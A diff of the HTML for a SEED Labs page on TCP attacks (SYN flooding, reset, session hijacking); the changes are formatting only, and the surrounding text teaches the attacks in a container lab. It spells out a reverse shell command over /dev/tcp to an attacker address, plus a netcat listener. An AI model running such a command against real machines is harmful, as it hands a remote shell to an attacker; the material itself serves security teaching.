@@ -1,7 +1,7 @@
 
 
 <!DOCTYPE html>
-<html class="writer-html5" lang="en" >
+<html class="writer-html4" lang="en" >
 <head>
   <meta charset="utf-8" />
   
@@ -13,8 +13,6 @@
   
   <link rel="stylesheet" href="../../_static/css/theme.css" type="text/css" />
   <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
-  <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
-  <link rel="stylesheet" href="../../_static/css/theme.css" type="text/css" />
 
   
   
@@ -31,10 +29,11 @@
   
     
       <script type="text/javascript" id="documentation_options" data-url_root="../../" src="../../_static/documentation_options.js"></script>
-        <script data-url_root="../../" id="documentation_options" src="../../_static/documentation_options.js"></script>
-        <script src="../../_static/jquery.js"></script>
-        <script src="../../_static/underscore.js"></script>
-        <script src="../../_static/doctools.js"></script>
+        <script type="text/javascript" src="../../_static/jquery.js"></script>
+        <script type="text/javascript" src="../../_static/underscore.js"></script>
+        <script type="text/javascript" src="../../_static/doctools.js"></script>
+        <script type="text/javascript" src="../../_static/language_data.js"></script>
+        <script async="async" type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
     
     <script type="text/javascript" src="../../_static/js/theme.js"></script>
 
@@ -221,20 +220,20 @@ of network security and why many network security measures are needed.
 In this lab, students will conduct several attacks on TCP. This lab
 covers the following topics:</p>
 <ul class="simple">
-<li><p>The TCP protocol</p></li>
-<li><p>TCP SYN flood attack, and SYN cookies</p></li>
-<li><p>TCP reset attack</p></li>
-<li><p>TCP session hijacking attack</p></li>
-<li><p>Reverse shell</p></li>
-<li><p>A special type of TCP attack, the Mitnick attack, is covered in a
-separate lab.</p></li>
+<li>The TCP protocol</li>
+<li>TCP SYN flood attack, and SYN cookies</li>
+<li>TCP reset attack</li>
+<li>TCP session hijacking attack</li>
+<li>Reverse shell</li>
+<li>A special type of TCP attack, the Mitnick attack, is covered in a
+separate lab.</li>
 </ul>
 <p><strong>Readings and videos.</strong> Detailed coverage of the TCP attacks can be found in the following:</p>
 <ul class="simple">
-<li><p>Chapter 16 of the SEED Book, Computer &amp; Internet Security: A Hands-on Approach, 2nd Edition,
-by Wenliang Du. See details at <a class="reference external" href="https://www.handsonsecurity.net">https://www.handsonsecurity.net</a>.</p></li>
-<li><p>Section 6 of the SEED Lecture, Internet Security: A Hands-on Approach, by Wenliang Du. See details
-at <a class="reference external" href="https://www.handsonsecurity.net/video.html">https://www.handsonsecurity.net/video.html</a>.</p></li>
+<li>Chapter 16 of the SEED Book, Computer &amp; Internet Security: A Hands-on Approach, 2nd Edition,
+by Wenliang Du. See details at <a class="reference external" href="https://www.handsonsecurity.net">https://www.handsonsecurity.net</a>.</li>
+<li>Section 6 of the SEED Lecture, Internet Security: A Hands-on Approach, by Wenliang Du. See details
+at <a class="reference external" href="https://www.handsonsecurity.net/video.html">https://www.handsonsecurity.net/video.html</a>.</li>
 </ul>
 <p><strong>Lab environment.</strong> This lab has been tested on the SEED Ubuntu 20.04 VM. You can download a pre-built
 image from the SEED website, and run the SEED VM on your own computer. However, most of the SEED
@@ -243,7 +242,7 @@ labs can be conducted on the cloud, and you can follow our instruction to create
 <div class="section" id="lab-environment">
 <h2>Lab Environment<a class="headerlink" href="#lab-environment" title="Permalink to this headline">¶</a></h2>
 <p>In this lab, we need to have at least three machines. We use containers
-to set up the lab environment. Figure 1
+to set up the lab environment. Figure&nbsp;1
 depicts the lab setup. We will use the attacker container to launch
 attacks, while using the other three containers as the victim and user
 machines. We assume all these machines are on the same LAN. Students can
@@ -251,7 +250,7 @@ also use three virtual machines for this lab, but it will be much more
 convenient to use containers.</p>
 <div class="figure align-center" id="id1">
 <img alt="../../_images/tcp_attacks_img1.png" src="../../_images/tcp_attacks_img1.png" />
-<p class="caption"><span class="caption-text">Figure 1: Lab environment setup</span><a class="headerlink" href="#id1" title="Permalink to this image">¶</a></p>
+<p class="caption"><span class="caption-text">Figure 1: Lab environment setup</span></p>
 </div>
 <div class="section" id="container-setup-and-commands">
 <h3>Container Setup and Commands<a class="headerlink" href="#container-setup-and-commands" title="Permalink to this headline">¶</a></h3>
@@ -304,7 +303,7 @@ attacker machine. If you look at the Docker Compose file, you will see
 that the attacker container is configured differently from the other
 containers.</p>
 <ul>
-<li><p><em>Shared folder.</em> When we use the attacker container to launch
+<li><p class="first"><em>Shared folder.</em> When we use the attacker container to launch
 attacks, we need to put the attacking code inside the attacker
 container.Code editing is more convenient inside the VM than in containers,
 because we can use our favorite editors. In order for the VM and container to share files, we have
@@ -318,7 +317,7 @@ VM), so they can be used inside the containers.</p>
 </pre></div>
 </div>
 </li>
-<li><p><em>Host mode.</em> In this lab, the attacker needs to be able to sniff packets, but running sniffer programs
+<li><p class="first"><em>Host mode.</em> In this lab, the attacker needs to be able to sniff packets, but running sniffer programs
 inside a container has problems, because a container is effectively attached to a virtual switch, so it
 can only see its own traffic, and it is never going to see the packets among other containers. To solve
 this problem, we use the <code class="docutils literal notranslate"><span class="pre">host</span></code> mode for the attacker container. This allows the attacker container to
@@ -344,7 +343,7 @@ Its password is <code class="docutils literal notranslate"><span class="pre">dee
 <h2>Task 1: SYN Flooding Attack<a class="headerlink" href="#task-1-syn-flooding-attack" title="Permalink to this headline">¶</a></h2>
 <div class="figure align-center" id="id2">
 <img alt="../../_images/tcp_attacks_img2.png" src="../../_images/tcp_attacks_img2.png" />
-<p class="caption"><span class="caption-text">Figure 2: SYN Flooding Attack</span><a class="headerlink" href="#id2" title="Permalink to this image">¶</a></p>
+<p class="caption"><span class="caption-text">Figure 2: SYN Flooding Attack</span></p>
 </div>
 <p>SYN flood is a form of DoS attack in which attackers send many SYN
 requests to a victim’s TCP port, but the attackers have no intention to
@@ -353,7 +352,7 @@ address or do not continue the procedure. Through this attack, attackers
 can flood the victim’s queue that is used for half-opened connections,
 i.e. the connections that has finished SYN, SYN-ACK, but has not yet
 gotten a final ACK back. When this queue is full, the victim cannot take
-any more connection. Figure 2 illustrates the attack.</p>
+any more connection. Figure&nbsp;2 illustrates the attack.</p>
 <p>The size of the queue has a system-wide setting. In Ubuntu OSes, we can
 check the setting using the following command. The OS sets this value
 based on the amount of the memory the system has: the more memory the
@@ -417,12 +416,14 @@ attack will fail. Multiple issues can contribute to the failure of the
 attack. They are listed in the following with guidelines on how to
 address them.</p>
 <ul>
-<li><p><strong>TCP cache issue:</strong> See Note A below.</p></li>
-<li><p><strong>VirtualBox issue:</strong> If you are doing the attack from one VM against
+<li><p class="first"><strong>TCP cache issue:</strong> See Note A below.</p>
+</li>
+<li><p class="first"><strong>VirtualBox issue:</strong> If you are doing the attack from one VM against
 another VM, instead of using our container setup, please see Note B
 below. This is not an issue if you are doing the attack using the
-container setup.</p></li>
-<li><p><strong>TCP retransmission issue:</strong> After sending out the SYN+ACK packet,
+container setup.</p>
+</li>
+<li><p class="first"><strong>TCP retransmission issue:</strong> After sending out the SYN+ACK packet,
 the victim machine will wait for the ACK packet. If it does not come
 in time, TCP will retransmit the SYN+ACK packet. How many times it
 will retransmit depends on the following kernel parameters (by
@@ -441,7 +442,7 @@ instances of the attack program in parallel. Please try this approach
 and see whether the success rate can be improved. How many instances
 should you run to achieve a reasonable success rate?</p>
 </li>
-<li><p><strong>The size of the queue:</strong> How many half-open connections can be
+<li><p class="first"><strong>The size of the queue:</strong> How many half-open connections can be
 stored in the queue can affect the success rate of the attack. The
 size of the queue be adjusted using the following command:</p>
 <div class="highlight-none notranslate"><div class="highlight"><pre><span></span># sysctl -w net.ipv4.tcp_max_syn_backlog=80
@@ -563,14 +564,14 @@ entire attack is automated. Please make sure that when you use Scapy’s
 <h2>Task 3: TCP Session Hijacking<a class="headerlink" href="#task-3-tcp-session-hijacking" title="Permalink to this headline">¶</a></h2>
 <div class="figure align-center" id="id3">
 <img alt="../../_images/tcp_attacks_img3.png" src="../../_images/tcp_attacks_img3.png" />
-<p class="caption"><span class="caption-text">Figure 3: TCP Session Hijacking Attack</span><a class="headerlink" href="#id3" title="Permalink to this image">¶</a></p>
+<p class="caption"><span class="caption-text">Figure 3: TCP Session Hijacking Attack</span></p>
 </div>
 <p>The objective of the TCP Session Hijacking attack is to hijack an
 existing TCP connection (session) between two victims by injecting
 malicious contents into this session. If this connection is a <code class="docutils literal notranslate"><span class="pre">telnet</span></code>
 session, attackers can inject malicious commands (e.g. deleting an
 important file) into this session, causing the victims to execute the
-malicious commands. Figure 3 depicts how the
+malicious commands. Figure&nbsp;3 depicts how the
 attack works. In this task, you need to demonstrate how you can hijack a
 <code class="docutils literal notranslate"><span class="pre">telnet</span></code> session between two computers. Your goal is to get the
 <code class="docutils literal notranslate"><span class="pre">telnet</span></code> server to run a malicious command from you. For the
@@ -623,7 +624,7 @@ connection on a given port. In this example, we will use <code class="docutils l
 This program allows us to specify a port number and can listen for a
 connection on that port. In the following demo, we show two windows,
 each one is from a different machine. The top window is the attack
-machine <code class="docutils literal notranslate"><span class="pre">10.9.0.1</span></code>, which runs <code class="docutils literal notranslate"><span class="pre">netcat</span></code> (<code class="docutils literal notranslate"><span class="pre">nc</span></code> for short),
+machine <code class="docutils literal notranslate"><span class="pre">10.9.0.1</span></code>, which runs <code class="docutils literal notranslate"><span class="pre">netcat</span></code>&nbsp;(<code class="docutils literal notranslate"><span class="pre">nc</span></code> for short),
 listening on port <code class="docutils literal notranslate"><span class="pre">9090</span></code>. The bottom window is the victim machine
 <code class="docutils literal notranslate"><span class="pre">10.9.0.5</span></code>, and we type the reverse shell command. As soon as the
 reverse shell gets executed, the top window indicates that we get a
@@ -650,17 +651,17 @@ shell. This is a reverse shell, i.e., it runs on <code class="docutils literal n
 <p>We provide a brief description on the reverse shell command in the
 following. Detailed explanation can be found in the SEED book.</p>
 <ul class="simple">
-<li><p><code class="docutils literal notranslate"><span class="pre">&quot;/bin/bash</span> <span class="pre">-i&quot;</span></code>: <code class="docutils literal notranslate"><span class="pre">i</span></code> stands for interactive, meaning that the
-shell must be interactive (must provide a shell prompt)</p></li>
-<li><p><code class="docutils literal notranslate"><span class="pre">&quot;&gt;</span> <span class="pre">/dev/tcp/10.9.0.1/9090&quot;</span></code>: This causes the output (<code class="docutils literal notranslate"><span class="pre">stdout</span></code>)
+<li><code class="docutils literal notranslate"><span class="pre">&quot;/bin/bash</span> <span class="pre">-i&quot;</span></code>: <code class="docutils literal notranslate"><span class="pre">i</span></code> stands for interactive, meaning that the
+shell must be interactive (must provide a shell prompt)</li>
+<li><code class="docutils literal notranslate"><span class="pre">&quot;&gt;</span> <span class="pre">/dev/tcp/10.9.0.1/9090&quot;</span></code>: This causes the output (<code class="docutils literal notranslate"><span class="pre">stdout</span></code>)
 of the shell to be redirected to the tcp connection to
 <code class="docutils literal notranslate"><span class="pre">10.9.0.1</span></code>’s port <code class="docutils literal notranslate"><span class="pre">9090</span></code>. The output <code class="docutils literal notranslate"><span class="pre">stdout</span></code> is represented
-by file descriptor number 1.</p></li>
-<li><p><code class="docutils literal notranslate"><span class="pre">&quot;0&lt;&amp;1&quot;</span></code>: File descriptor 0 represents the standard input
+by file descriptor number&nbsp;1.</li>
+<li><code class="docutils literal notranslate"><span class="pre">&quot;0&lt;&amp;1&quot;</span></code>: File descriptor 0 represents the standard input
 (<code class="docutils literal notranslate"><span class="pre">stdin</span></code>). This causes the <code class="docutils literal notranslate"><span class="pre">stdin</span></code> for the shell to be obtained
-from the tcp connection.</p></li>
-<li><p><code class="docutils literal notranslate"><span class="pre">&quot;2&gt;&amp;1&quot;</span></code>: File descriptor 2 represents standard error <code class="docutils literal notranslate"><span class="pre">stderr</span></code>.
-This causes the error output to be redirected to the tcp connection.</p></li>
+from the tcp connection.</li>
+<li><code class="docutils literal notranslate"><span class="pre">&quot;2&gt;&amp;1&quot;</span></code>: File descriptor 2 represents standard error <code class="docutils literal notranslate"><span class="pre">stderr</span></code>.
+This causes the error output to be redirected to the tcp connection.</li>
 </ul>
 <p>In summary, <code class="docutils literal notranslate"><span class="pre">&quot;/bin/bash</span> <span class="pre">-i</span> <span class="pre">&gt;</span> <span class="pre">/dev/tcp/10.9.0.1/9090</span> <span class="pre">0&lt;&amp;1</span> <span class="pre">2&gt;&amp;1&quot;</span></code> starts
 a <code class="docutils literal notranslate"><span class="pre">bash</span></code> shell, with its input coming from a tcp connection, and its
